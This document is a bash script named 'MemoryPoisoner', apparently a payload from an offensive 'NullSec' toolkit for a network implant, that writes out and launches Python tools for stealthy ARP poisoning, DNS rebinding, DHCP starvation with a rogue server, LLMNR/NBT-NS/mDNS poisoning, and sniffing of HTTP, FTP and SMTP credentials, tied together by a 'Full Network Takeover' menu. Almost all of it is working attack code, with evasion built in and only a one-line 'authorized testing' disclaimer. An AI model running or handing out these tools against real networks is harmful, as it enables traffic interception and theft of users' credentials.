#!/bin/bash
#
# MemoryPoisoner - ARP/DNS/DHCP Memory Attack Framework
# Advanced cache poisoning and protocol manipulation
# NullSec Suite | For authorized testing only
#
# UNIQUE FEATURES:
# - Persistent ARP cache poisoning with anti-detection
# - DNS rebinding attack automation  
# - DHCP starvation + rogue server
# - mDNS/LLMNR/NBT-NS poisoning
# - Protocol-level evasion techniques

PAYLOAD_NAME="MemoryPoisoner"
VERSION="1.0.0"
LOOT_DIR="/mmc/nullsec/memorypoisoner"
INTERFACE="br-lan"

show_banner() {
    echo -e "\033[1;31m"
    cat << "EOF"
  __  __                                 ____       _                            
 |  \/  | ___ _ __ ___   ___  _ __ _   _|  _ \ ___ (_)___  ___  _ __   ___ _ __  
 | |\/| |/ _ \ '_ ` _ \ / _ \| '__| | | | |_) / _ \| / __|/ _ \| '_ \ / _ \ '__| 
 | |  | |  __/ | | | | | (_) | |  | |_| |  __/ (_) | \__ \ (_) | | | |  __/ |    
 |_|  |_|\___|_| |_| |_|\___/|_|   \__, |_|   \___/|_|___/\___/|_| |_|\___|_|    
                                   |___/                                         
    [ Protocol Memory Attack Framework ]
    [ NullSec Suite v${VERSION} ]
EOF
    echo -e "\033[0m"
}

init_poisoner() {
    mkdir -p "$LOOT_DIR"/{captures,dns,dhcp,arp,logs}
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Disable ICMP redirects (stealth)
    echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
    
    echo "[*] MemoryPoisoner initialized"
}

# Advanced ARP poisoning with evasion
stealth_arp_poison() {
    local target_ip=$1
    local gateway_ip=$2
    
    echo "[*] Stealth ARP poisoning: $target_ip <-> $gateway_ip"
    
    # Get our MAC
    local our_mac=$(cat /sys/class/net/$INTERFACE/address)
    
    # Get target and gateway MACs
    local target_mac=$(arp -n | grep "$target_ip" | awk '{print $3}')
    local gateway_mac=$(arp -n | grep "$gateway_ip" | awk '{print $3}')
    
    # Create poisoning script with timing randomization
    cat > /tmp/arp_poison.py << 'POISON'
#!/usr/bin/env python3
import random
import time
from scapy.all import *

def stealth_poison(target_ip, target_mac, gateway_ip, gateway_mac, our_mac):
    """ARP poison with anti-detection measures"""
    
    while True:
        # Randomize timing to avoid detection
        delay = random.uniform(0.5, 3.0)
        
        # Vary packet construction
        if random.random() > 0.5:
            # Standard ARP reply
            pkt1 = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac)
            pkt2 = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=our_mac)
        else:
            # Gratuitous ARP
            pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip, hwdst="00:00:00:00:00:00", psrc=gateway_ip, hwsrc=our_mac)
            pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway_ip, hwdst="00:00:00:00:00:00", psrc=target_ip, hwsrc=our_mac)
        
        sendp([pkt1, pkt2], verbose=0, iface=conf.iface)
        time.sleep(delay)

import sys
stealth_poison(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
POISON
    
    chmod +x /tmp/arp_poison.py
    python3 /tmp/arp_poison.py "$target_ip" "$target_mac" "$gateway_ip" "$gateway_mac" "$our_mac" &
    echo $! > "$LOOT_DIR/arp/poison.pid"
    
    # Start packet capture
    tcpdump -i $INTERFACE -w "$LOOT_DIR/captures/mitm_$(date +%s).pcap" host $target_ip &
}

# DNS rebinding attack
dns_rebinding_attack() {
    local target_domain=$1
    local internal_ip=$2
    
    echo "[*] Setting up DNS rebinding: $target_domain -> $internal_ip"
    
    # Create rebinding DNS server
    cat > /tmp/rebind_dns.py << 'REBIND'
#!/usr/bin/env python3
import socket
import struct
import threading
import time

class RebindingDNS:
    def __init__(self, domain, external_ip, internal_ip, ttl=0):
        self.domain = domain
        self.external_ip = external_ip
        self.internal_ip = internal_ip
        self.ttl = ttl
        self.query_count = {}
        
    def build_response(self, query, ip):
        """Build DNS response packet"""
        # Parse query
        transaction_id = query[:2]
        
        # Build response header
        flags = struct.pack('>H', 0x8180)  # Standard response, no error
        questions = struct.pack('>H', 1)
        answers = struct.pack('>H', 1)
        authority = struct.pack('>H', 0)
        additional = struct.pack('>H', 0)
        
        # Copy question section from query
        question_end = 12
        while query[question_end] != 0:
            question_end += 1
        question_end += 5  # null byte + type + class
        question = query[12:question_end]
        
        # Build answer
        answer_name = struct.pack('>H', 0xc00c)  # Pointer to name in question
        answer_type = struct.pack('>H', 1)  # A record
        answer_class = struct.pack('>H', 1)  # IN class
        answer_ttl = struct.pack('>I', self.ttl)  # Short TTL for rebinding
        answer_rdlength = struct.pack('>H', 4)  # IPv4 = 4 bytes
        answer_rdata = socket.inet_aton(ip)
        
        response = (transaction_id + flags + questions + answers + 
                   authority + additional + question + answer_name + 
                   answer_type + answer_class + answer_ttl + 
                   answer_rdlength + answer_rdata)
        
        return response
    
    def handle_query(self, data, addr, sock):
        """Handle DNS query with rebinding logic"""
        try:
            # Extract queried domain
            query_domain = ''
            i = 12
            while data[i] != 0:
                length = data[i]
                query_domain += data[i+1:i+1+length].decode() + '.'
                i += length + 1
            query_domain = query_domain[:-1]
            
            # Check if it's our target domain
            if self.domain in query_domain:
                client_key = f"{addr[0]}:{query_domain}"
                self.query_count[client_key] = self.query_count.get(client_key, 0) + 1
                
                # First query: return external IP
                # Subsequent queries: return internal IP (rebind!)
                if self.query_count[client_key] <= 1:
                    ip = self.external_ip
                    print(f"[DNS] {addr[0]} -> {query_domain} = {ip} (external)")
                else:
                    ip = self.internal_ip
                    print(f"[DNS] {addr[0]} -> {query_domain} = {ip} (REBIND!)")
                
                response = self.build_response(data, ip)
                sock.sendto(response, addr)
            else:
                # Forward to real DNS
                real_dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                real_dns.sendto(data, ('8.8.8.8', 53))
                response, _ = real_dns.recvfrom(512)
                sock.sendto(response, addr)
                real_dns.close()
                
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def run(self):
        """Run DNS server"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('0.0.0.0', 53))
        print(f"[*] Rebinding DNS server running")
        print(f"[*] Domain: {self.domain}")
        print(f"[*] External: {self.external_ip} -> Internal: {self.internal_ip}")
        
        while True:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=self.handle_query, args=(data, addr, sock)).start()

import sys
dns = RebindingDNS(sys.argv[1], sys.argv[2], sys.argv[3])
dns.run()
REBIND
    
    chmod +x /tmp/rebind_dns.py
    
    # Get our external IP
    local external_ip=$(curl -s ifconfig.me || echo "1.2.3.4")
    
    python3 /tmp/rebind_dns.py "$target_domain" "$external_ip" "$internal_ip" &
    echo $! > "$LOOT_DIR/dns/rebind.pid"
}

# DHCP starvation + rogue server
dhcp_takeover() {
    local target_subnet=$1
    
    echo "[*] DHCP starvation + rogue server attack"
    
    # Step 1: Starve the legitimate DHCP server
    cat > /tmp/dhcp_starve.py << 'STARVE'
#!/usr/bin/env python3
from scapy.all import *
import random

def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def dhcp_starve(iface):
    """Exhaust DHCP pool with fake requests"""
    print("[*] Starting DHCP starvation...")
    
    for i in range(255):
        mac = random_mac()
        
        # DHCP Discover
        dhcp_discover = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=bytes.fromhex(mac.replace(':', ''))) /
            DHCP(options=[
                ("message-type", "discover"),
                ("hostname", f"host{i}"),
                "end"
            ])
        )
        
        sendp(dhcp_discover, iface=iface, verbose=0)
        print(f"[*] Sent DHCP discover {i+1}/255", end='\r')
    
    print("\n[*] Starvation complete")

import sys
dhcp_starve(sys.argv[1])
STARVE
    
    python3 /tmp/dhcp_starve.py $INTERFACE
    
    # Step 2: Start rogue DHCP server
    cat > /tmp/rogue_dhcp.conf << DHCP
subnet ${target_subnet%.*}.0 netmask 255.255.255.0 {
    range ${target_subnet%.*}.100 ${target_subnet%.*}.200;
    option routers $(ip route | grep default | awk '{print $3}');
    option domain-name-servers $(hostname -I | awk '{print $1}');
    option domain-name "pwned.local";
    default-lease-time 60;
    max-lease-time 120;
}
DHCP
    
    # Start rogue DHCP
    dnsmasq --interface=$INTERFACE \
            --dhcp-range=${target_subnet%.*}.100,${target_subnet%.*}.200,255.255.255.0,1h \
            --dhcp-option=6,$(hostname -I | awk '{print $1}') \
            --no-daemon \
            --log-queries \
            --log-dhcp &
    
    echo $! > "$LOOT_DIR/dhcp/rogue.pid"
    echo "[*] Rogue DHCP server running"
}

# mDNS/LLMNR/NBT-NS poisoning (Responder-style)
multicast_poison() {
    echo "[*] Starting multicast DNS poisoning..."
    
    cat > /tmp/multicast_poison.py << 'MCAST'
#!/usr/bin/env python3
import socket
import struct
import threading

class MulticastPoisoner:
    def __init__(self, our_ip):
        self.our_ip = our_ip
        
    def mdns_poison(self):
        """mDNS poisoner - respond to .local queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', 5353))
        
        # Join multicast group
        mreq = struct.pack("4sl", socket.inet_aton("224.0.0.251"), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        
        print("[*] mDNS poisoner running on 224.0.0.251:5353")
        
        while True:
            data, addr = sock.recvfrom(1024)
            if b'.local' in data.lower():
                print(f"[mDNS] Poisoning response to {addr[0]}")
                # Send poisoned response with our IP
                # (Simplified - real impl would parse and respond properly)
    
    def llmnr_poison(self):
        """LLMNR poisoner - Windows name resolution"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', 5355))
        
        mreq = struct.pack("4sl", socket.inet_aton("224.0.0.252"), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        
        print("[*] LLMNR poisoner running on 224.0.0.252:5355")
        
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"[LLMNR] Query from {addr[0]}: {data}")
            
            # Build LLMNR response
            trans_id = data[:2]
            flags = struct.pack('>H', 0x8000)  # Response flag
            
            # Point to our IP
            response = trans_id + flags + data[4:12]  # Copy questions/answers counts
            response += data[12:]  # Copy question
            
            # Add answer pointing to us
            response += struct.pack('>H', 0xc00c)  # Pointer to name
            response += struct.pack('>H', 1)  # Type A
            response += struct.pack('>H', 1)  # Class IN
            response += struct.pack('>I', 30)  # TTL
            response += struct.pack('>H', 4)  # RDLENGTH
            response += socket.inet_aton(self.our_ip)
            
            sock.sendto(response, addr)
            print(f"[LLMNR] Poisoned {addr[0]} -> {self.our_ip}")
    
    def nbtns_poison(self):
        """NetBIOS Name Service poisoner"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', 137))
        
        print("[*] NBT-NS poisoner running on UDP/137")
        
        while True:
            data, addr = sock.recvfrom(1024)
            print(f"[NBT-NS] Query from {addr[0]}")
            
            # Build NBT-NS response
            trans_id = data[:2]
            
            response = trans_id
            response += struct.pack('>H', 0x8500)  # Flags: response
            response += struct.pack('>H', 0)  # Questions
            response += struct.pack('>H', 1)  # Answers
            response += struct.pack('>H', 0)  # Authority
            response += struct.pack('>H', 0)  # Additional
            
            # Answer section
            response += data[12:12+34]  # Copy encoded name from query
            response += struct.pack('>H', 0x20)  # Type NB
            response += struct.pack('>H', 1)  # Class IN
            response += struct.pack('>I', 300)  # TTL
            response += struct.pack('>H', 6)  # RDLENGTH
            response += struct.pack('>H', 0)  # Flags
            response += socket.inet_aton(self.our_ip)
            
            sock.sendto(response, addr)
            print(f"[NBT-NS] Poisoned {addr[0]} -> {self.our_ip}")
    
    def run(self):
        threads = [
            threading.Thread(target=self.mdns_poison, daemon=True),
            threading.Thread(target=self.llmnr_poison, daemon=True),
            threading.Thread(target=self.nbtns_poison, daemon=True),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

import sys
poisoner = MulticastPoisoner(sys.argv[1])
poisoner.run()
MCAST
    
    chmod +x /tmp/multicast_poison.py
    
    local our_ip=$(hostname -I | awk '{print $1}')
    python3 /tmp/multicast_poison.py "$our_ip" &
    echo $! > "$LOOT_DIR/multicast.pid"
}

# Capture credentials from poisoned traffic
capture_creds() {
    echo "[*] Starting credential capture..."
    
    # Capture HTTP/FTP/SMTP/etc credentials
    tcpdump -i $INTERFACE -w "$LOOT_DIR/captures/creds_$(date +%s).pcap" \
        'port 80 or port 21 or port 25 or port 110 or port 143 or port 445 or port 139' &
    
    # Real-time credential extraction
    cat > /tmp/cred_extract.py << 'CREDS'
#!/usr/bin/env python3
from scapy.all import *
import re

def extract_creds(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
        
        # HTTP Basic Auth
        if 'Authorization: Basic' in payload:
            import base64
            match = re.search(r'Authorization: Basic ([A-Za-z0-9+/=]+)', payload)
            if match:
                creds = base64.b64decode(match.group(1)).decode()
                print(f"[HTTP] Basic Auth: {creds}")
        
        # HTTP Form data
        if 'pass' in payload.lower() or 'pwd' in payload.lower():
            print(f"[HTTP] Possible password in: {payload[:200]}")
        
        # FTP
        if payload.startswith('USER ') or payload.startswith('PASS '):
            print(f"[FTP] {payload.strip()}")
        
        # SMTP
        if 'AUTH LOGIN' in payload or 'AUTH PLAIN' in payload:
            print(f"[SMTP] Auth detected: {payload[:100]}")

import sys
print("[*] Sniffing for credentials...")
sniff(iface=sys.argv[1], prn=extract_creds, store=0)
CREDS
    
    python3 /tmp/cred_extract.py $INTERFACE &
    echo $! > "$LOOT_DIR/creds.pid"
}

# Main menu
main_menu() {
    while true; do
        show_banner
        echo ""
        echo "1) Initialize Poisoner"
        echo "2) Stealth ARP Poison"
        echo "3) DNS Rebinding Attack"
        echo "4) DHCP Takeover"
        echo "5) Multicast Poison (mDNS/LLMNR/NBT-NS)"
        echo "6) Start Credential Capture"
        echo "7) Full Network Takeover (All attacks)"
        echo "8) View Captured Data"
        echo "0) Stop & Exit"
        echo ""
        read -p "[MemoryPoisoner]> " choice
        
        case $choice in
            1) init_poisoner ;;
            2) 
                read -p "Target IP: " target
                read -p "Gateway IP: " gateway
                stealth_arp_poison "$target" "$gateway"
                ;;
            3)
                read -p "Target domain (e.g., evil.com): " domain
                read -p "Internal IP to rebind to: " internal
                dns_rebinding_attack "$domain" "$internal"
                ;;
            4)
                read -p "Target subnet (e.g., 192.168.1): " subnet
                dhcp_takeover "$subnet"
                ;;
            5) multicast_poison ;;
            6) capture_creds ;;
            7)
                init_poisoner
                read -p "Target subnet (e.g., 192.168.1): " subnet
                read -p "Gateway IP: " gateway
                dhcp_takeover "$subnet"
                multicast_poison
                capture_creds
                echo "[*] Full network takeover initiated!"
                ;;
            8)
                echo ""
                echo "=== Captured Data ==="
                ls -la "$LOOT_DIR/captures/" 2>/dev/null
                echo ""
                read -p "Press Enter..."
                ;;
            0)
                for pid in "$LOOT_DIR"/*/*.pid; do
                    kill $(cat "$pid" 2>/dev/null) 2>/dev/null
                done
                pkill -f "dnsmasq"
                exit 0
                ;;
        esac
    done
}

main_menu
